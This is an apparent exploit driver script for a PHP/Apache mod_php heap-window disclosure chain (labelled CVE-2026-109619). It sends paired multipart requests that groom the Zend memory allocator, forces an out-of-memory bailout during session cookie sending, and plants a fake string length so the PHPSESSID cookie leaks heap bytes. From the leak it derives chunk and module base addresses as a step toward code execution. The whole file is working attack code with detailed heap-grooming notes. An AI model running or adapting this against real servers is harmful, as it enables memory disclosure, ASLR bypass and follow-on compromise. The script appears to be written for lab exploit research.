#!/usr/bin/env python3
# INDEX: zero-knowledge cookie over-read chunk/module-base disclosure | apache | other(lab --service) | session_start() | build | fresh worker per shot
"""apache_cookie_disclose.py - the CVE-2026-109619 Apache mod_php cookie-window
disclosure chain driver.

Drives the zero-knowledge heap-window disclosure: a warmup + paired
R1/R2 requests on a fresh worker (R1 OOMs inside php_session_send_cookie,
leaving the created sid dangling; R2 reclaims it with a fake zend_string whose
len is the attacker window, reflecting that many heap bytes in the Set-Cookie
PHPSESSID). Sweeps the free-page tune ladder, guards the track-vars HashTable
headroom, saves the raw window to poc/cookie-window.bin and derives the ZendMM chunk
base + (when libphp is adjacent) the module base. Needs --service (the
groom is pinned to the in-container curl client). Proven on php:8.4.26-apache
(mod_php, 16M).

Usage:
    python3 -I poc/chains/apache_cookie_disclose.py \
        http://127.0.0.1:8098 --service apache-vuln
"""
from __future__ import annotations

import argparse
import os
import re
import sys

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.docker_compose import compose_restart  # noqa: E402
from common.http_urllib import probe_php_version  # noqa: E402
from common.offsets import load_offsets  # noqa: E402
from primitives.read_leak.apache_cookie_window_leak import (  # noqa: E402
    COOKIE_RCE_BULK, COOKIE_RCE_PAD40, COOKIE_RCE_R2_PRESSURE, COOKIE_RCE_SPRAY_PRIME, COOKIE_RCE_TAIL, COOKIE_RCE_TAIL2,
    COOKIE_RCE_WINDOW, cookie_rce_r2_parts, cookie_rce_shot)
from primitives.read_leak.leak_parsers import parse_cookie_leak  # noqa: E402
from primitives.read_leak.proc_maps_bootstrap import bootstrap_proc_maps  # noqa: E402


def cmd_apache_cookie_disclose(args):
    """Zero-knowledge round 1: the PS(id) cookie disclosure."""
    base = args.url.rstrip("/")
    svc = args.service
    if svc is None:
        raise SystemExit("[apache_cookie_disclose] needs --service (the layout is pinned to "
                         "the in-container curl client)")
    # headroom guard (CVE-2026-109619): R2 registers every multipart
    # field into the $_POST track-vars HashTable via php_register_variable_ex.
    # That table grows by doubling; the 513th distinct key forces the 512->1024
    # resize, a single 10-page (40960-byte) bucket-array allocation. R2 runs
    # with the 8 ZendMM chunks already ~full from the bulk fill, so that resize
    # OOMs and R2 dies in field registration - BEFORE the dance/reset_id/
    # send_cookie (gdb bt: _zend_bailout <- zend_error_noreturn <- [large
    # alloc] <- zend_hash_update_ind <- php_register_variable_ex <-
    # rfc1867_post_handler). Keep R2 distinct keys <= 512.
    _r2names = set()
    for _h, _b in cookie_rce_r2_parts(args.spray, args.window, args.bulk,
                              args.pad40, args.prime, args.pressure):
        _m = re.search(r'name="([^"\[]+)', _h)
        if _m:
            _r2names.add(_m.group(1))
    if len(_r2names) > 512:
        print(f"[apache_cookie_disclose] WARNING: R2 has {len(_r2names)} distinct $_POST "
              f"fields (>512) - the track-vars HT resize (512->1024) will OOM "
              f"at 40960 before the dance. Reduce --spray/--pad40/--prime so "
              f"the distinct count is <= 512 (fixed R2 fields = "
              f"{len(_r2names) - args.spray}, so --spray <= "
              f"{512 - (len(_r2names) - args.spray)}).")
    print(f"[apache_cookie_disclose] bulk={args.bulk} x 16KiB, tail bins "
          f"{[v for v, _ in COOKIE_RCE_TAIL + COOKIE_RCE_TAIL2]}, pad40={args.pad40}, "
          f"prime={args.prime}, pressure={args.pressure}, "
          f"tune sweeps the remaining free pages; "
          f"spray={args.spray} x b320, window={args.window}")

    def run_pair(tune, parity=False, restart=True):
        if restart:
            compose_restart(svc)
        r1h, r2h, r2b, cookie, verdict = cookie_rce_shot(svc, base, tune,
                                                  args.spray, args.window,
                                                  args.bulk, parity,
                                                  args.pad40, args.prime,
                                                  args.pressure)
        s1 = r1h.splitlines()[0].decode("utf-8", "replace") if r1h else "?"
        s2 = r2h.splitlines()[0].decode("utf-8", "replace") if r2h else "?"
        r1ck = b"Set-Cookie" in r1h
        print(f"[apache_cookie_disclose] tune={tune}{'/p' if parity else ''}: R1 {s1}"
              f"{'+cookie' if r1ck else ''}, R2 {s2} -> cookie verdict: "
              f"{verdict}"
              + (f" ({len(cookie)} bytes)" if cookie is not None else ""))
        if args.show and cookie is not None:
            print(f"[apache_cookie_disclose]   cookie[:64] = {cookie[:64]!r}")
        return cookie, verdict

    if args.tune is not None:
        cookie, verdict = run_pair(args.tune, args.parity, args.restart)
    else:
        # Sweep the last tune field (2-page steps) x the parity field (1
        # page). Classes: R1 completes 200 -> too many free pages; R1 500
        # + Set-Cookie -> the OOM landed after php_session_send_cookie; R1 500
        # no cookie + R2 disclosure -> HIT (e_id's b800 carve OOMed inside
        # send_cookie); R1 500 no cookie + R2 clean -> the OOM before the
        # session chain (in the ladder).
        cookie, verdict = None, "none"
        for t in (0, 3048, 4072, 8168, 12264):
            for parity in (False, True):
                cookie, verdict = run_pair(t, parity)
                if verdict == "hit":
                    break
            if verdict == "hit":
                break
        if verdict != "hit":
            print("[apache_cookie_disclose] no disclosure in the sweep - adjust --bulk (10 "
                  "pages per field) or inspect single shots with --tune/--gt")
            return None

    if verdict != "hit" or cookie is None:
        print("[apache_cookie_disclose] no disclosure window captured (rerun the sweep, or "
              "tune --spray/--window if the verdict was clean inside the "
              "window - the spray then missed the freed sid slot)")
        return None

    print(f"[apache_cookie_disclose] DISCLOSURE: PHPSESSID carries {len(cookie)} window "
          f"bytes (fake len {args.window} planted over the reclaimed sid)")
    open(os.path.join(_POC_ROOT, "cookie-window.bin"), "wb").write(cookie)
    print("[apache_cookie_disclose] window saved to poc/cookie-window.bin")
    version, sapi = probe_php_version(base, svc) if not args.version \
        else (args.version, None)
    if not version:
        print("[apache_cookie_disclose] (no version probe; skipping the family parse)")
        return {"cookie": cookie}
    off = load_offsets(version, sapi)
    try:
        got = parse_cookie_leak(cookie, off)
    except ValueError as e:
        print(f"[apache_cookie_disclose] family parse: {e}")
        return {"cookie": cookie}
    bb_s = (f"{got['binbase']:#x}" if got.get("binbase") is not None
            else "unavailable (chunk-only; proc-seeded-rce re-derives)")
    print(f"[apache_cookie_disclose] derived: chunk={got['chunk']:#x} "
          f"binbase={bb_s} (PHP {version} offsets)")
    if args.gt and svc:
        # Ground truth: /proc/1/maps must contain both regions (binbase
        # cross-checked only when the parse derived one; the chunk-only win still
        # cross-checks the chunk).
        binbase, chunks = bootstrap_proc_maps(svc, base)
        ok_c = got["chunk"] in (chunks or [])
        bb_gt = ("n/a (chunk-only)" if got.get("binbase") is None
                 else ("OK" if binbase == got["binbase"] else "MISMATCH"))
        print(f"[apache_cookie_disclose] ground truth: binbase {binbase and hex(binbase)} "
              f"({bb_gt}), chunks "
              f"{[hex(c) for c in chunks or []]} "
              f"({'OK' if ok_c else 'MISMATCH'})")
    return {"cookie": cookie, **got}


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("url")
    ap.add_argument("--service", default=None,
                    help="docker compose service to run curl inside (lab mode; "
                         "required - the layout is pinned to the in-container "
                         "client)")
    ap.add_argument("--tune", type=lambda v: int(v, 0), default=None,
                    help="skip the sweep: fire one R1+R2 pair with this tune "
                         "field size (the free-page knob)")
    ap.add_argument("--parity", action="store_true",
                    help="with --tune: add the 1-page parity field")
    ap.add_argument("--bulk", type=int, default=COOKIE_RCE_BULK,
                    help="number of 16-KiB bulk fill fields (10 pages each)")
    ap.add_argument("--spray", type=int, default=16,
                    help="R2 spray field count (b320 fake-string values; keep "
                         "< 21 so one b320 group serves the tail + spray, AND "
                         "keep R2's total distinct $_POST keys <= 512 - the "
                         "513th field resizes the track-vars HashTable "
                         "512->1024 and OOMs at 40960 before the dance, see "
                         "the headroom guard in cmd_apache_cookie_disclose)")
    ap.add_argument("--pad40", type=int, default=COOKIE_RCE_PAD40,
                    help="extra 15-byte fields in both requests: the b40 chain "
                         "spills into a second b40 page so the stale R1 "
                         "ps_files/basedir slots land in a live R2 b40 page")
    ap.add_argument("--prime", type=int, default=COOKIE_RCE_SPRAY_PRIME,
                    help="R2 primer fields ahead of the dup pair: the b320 "
                         "copy-chain alignment so the freed dup copy is the "
                         "stale sid slot (the spray's raw target)")
    ap.add_argument("--window", type=int, default=COOKIE_RCE_WINDOW,
                    help="the fake ZSTR_LEN (disclosure window bytes)")
    ap.add_argument("--pressure", type=int, default=COOKIE_RCE_R2_PRESSURE,
                    help="R2 fine pressure (nested pr[] b128 fields, 128-byte "
                         "granularity): tune R2's memory so the OOM lands in "
                         "the post-send_cookie / pre-s_read span (survive-to-"
                         "flush - clean bailout WITH the Set-Cookie leak) "
                         "instead of at the poisoning s_read release; sweep "
                         "vs window")
    ap.add_argument("--version", default=None,
                    help="PHP version (offsets table for the family parse; "
                         "default: probe index.php)")
    ap.add_argument("--show", action="store_true",
                    help="print the first cookie bytes")
    ap.add_argument("--gt", action="store_true",
                    help="cross-check the derived chunk/binbase against "
                         "/proc/1/maps (lab only)")
    ap.add_argument("--restart", action="store_true",
                    help="with --tune: restart the worker before the pair "
                         "(default: no restart)")
    cmd_apache_cookie_disclose(ap.parse_args())


if __name__ == "__main__":
    main()
